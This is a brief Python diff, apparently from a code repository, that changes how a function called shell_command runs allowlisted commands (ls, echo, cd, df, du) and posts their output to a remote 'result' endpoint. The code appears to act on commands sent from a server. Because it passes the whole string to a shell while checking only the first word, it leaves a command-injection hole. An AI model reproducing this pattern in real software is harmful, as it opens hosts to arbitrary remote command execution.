@@ -45,9 +45,9 @@ def shell_command(com: str):
             }).json()
             return True
     if d[0] in {'ls', 'echo', 'cd', 'df', 'du'}:
-        finishproc = subprocess.run(com, capture_output=True, shell=True, universal_newlines=True)
+        result = subprocess.check_output(com, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
         requests.post(urljoin(url_base, "result"), json={
-            "result": finishproc.stdout + finishproc.stderr
+            "result": result
         }).json()
     if d[0] == 'quit':
         raise KeyboardInterrupt
